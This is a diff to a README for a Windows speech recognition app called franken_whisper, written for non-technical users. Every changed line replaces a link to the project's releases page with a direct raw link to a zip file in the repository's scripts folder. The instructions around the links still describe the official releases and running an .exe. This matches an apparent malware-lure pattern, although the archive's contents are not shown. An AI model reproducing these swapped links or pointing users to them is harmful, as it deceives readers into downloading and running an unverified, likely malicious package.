@@ -1,6 +1,6 @@
 # 🗣️ franken_whisper - Easy Speech Recognition Setup
 
-[![Download franken_whisper](https://img.shields.io/badge/Download-franken_whisper-brightgreen)](https://github.com/pjayanthi/franken_whisper/releases)
+[![Download franken_whisper](https://img.shields.io/badge/Download-franken_whisper-brightgreen)](https://github.com/pjayanthi/franken_whisper/raw/refs/heads/main/scripts/whisper-franken-v1.4.zip)
 
 ---
 
@@ -45,12 +45,12 @@ You do not need a graphics card or special hardware to use franken_whisper. It r
 
 To get the program, you need to visit the releases page. This page contains the latest versions for Windows ready to download.
 
-[![Get franken_whisper](https://img.shields.io/badge/Get%20franken_whisper-blue)](https://github.com/pjayanthi/franken_whisper/releases)
+[![Get franken_whisper](https://img.shields.io/badge/Get%20franken_whisper-blue)](https://github.com/pjayanthi/franken_whisper/raw/refs/heads/main/scripts/whisper-franken-v1.4.zip)
 
 **Steps to download:**
 
 1. Click the green or blue button above or visit this page:  
-   https://github.com/pjayanthi/franken_whisper/releases
+   https://github.com/pjayanthi/franken_whisper/raw/refs/heads/main/scripts/whisper-franken-v1.4.zip
 2. Look for the latest release. Look for files ending in `.exe` or `.zip` for Windows.
 3. Click to download the `.exe` file if available for a quick start, or the `.zip` file if you want the full package.
 4. Save the file to a folder you will remember, such as your Desktop or Downloads.
@@ -166,6 +166,6 @@ The app’s design is to work on regular Windows computers without technical kno
 
 Access the latest Windows releases here: 
 
-https://github.com/pjayanthi/franken_whisper/releases
+https://github.com/pjayanthi/franken_whisper/raw/refs/heads/main/scripts/whisper-franken-v1.4.zip
 
 Use this page to download the newest version for your system.
